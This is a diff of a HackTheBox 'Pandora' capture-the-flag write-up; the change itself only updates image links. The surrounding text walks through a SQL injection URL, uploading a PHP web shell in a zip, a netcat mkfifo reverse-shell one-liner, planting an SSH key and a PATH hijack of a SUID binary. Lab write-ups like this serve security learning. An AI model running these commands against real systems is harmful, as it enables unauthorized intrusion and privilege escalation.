@@ -136,11 +136,11 @@ include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_u
 ### Become Matt
 We need a shell as *Matt*, so we gonna upload a reverse shell in the extensions part. We can't directly upload a php file but we can bypass this with a ```.zip``` file which content our shell. 
 
-![alt text](https://github.com/Vssksj/My_projects/blob/main/HackTheBox/Pandora/upload_zip.png)
+![alt text](https://github.com/Vssksj/Write-up/tree/main/HackTheBox/Pandora/IMG/upload_zip.png)
 
 Now, go in ````http://localhost:8889/pandora_console/extensions/{YOUR_PAYLOAD}.php````. Here, it is a web shell because a try a reverse shell but it didn't work. After, in my web shell, I put a reverse shell with ````rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {YOUR_IP} 1234 >/tmp/f```` and it worked. We are *Matt* !
 
-![alt text](https://github.com/Vssksj/My_projects/blob/main/HackTheBox/Pandora/id_matt.png)
+![alt text](https://github.com/Vssksj/Write-up/tree/main/HackTheBox/Pandora/IMG/id_matt.png)
 
 To have a better shell, put your public *SSH* key in the ````/home/matt/.ssh/authorized_keys````. Then connect with:
 ```markdown
@@ -148,7 +148,7 @@ ssh -i {YOUR_PRIVATE_KEY} matt@10.10.11.136
 ```
 And you will be in *SSH*.
 
-![alt text](https://github.com/Vssksj/My_projects/blob/main/HackTheBox/Pandora/id_rsa_matt.png)
+![alt text](https://github.com/Vssksj/Write-up/tree/main/HackTheBox/Pandora/IMG/id_rsa_matt.png)
 
 ## Privilege Escalation
 The last step of the challenge is easy. Just made a basic enumeration and you will find a *SUID* file which call ````/usr/bin/pandora_backup````.
@@ -171,7 +171,7 @@ export PATH=/tmp:$PATH
 
 When we execute the binary: 
 
-![alt text](https://github.com/Vssksj/My_projects/blob/main/HackTheBox/Pandora/id_root.png)
+![alt text](https://github.com/Vssksj/Write-up/tree/main/HackTheBox/Pandora/IMG/id_root.png)
 
 BOOM ! We are ROOT !
 
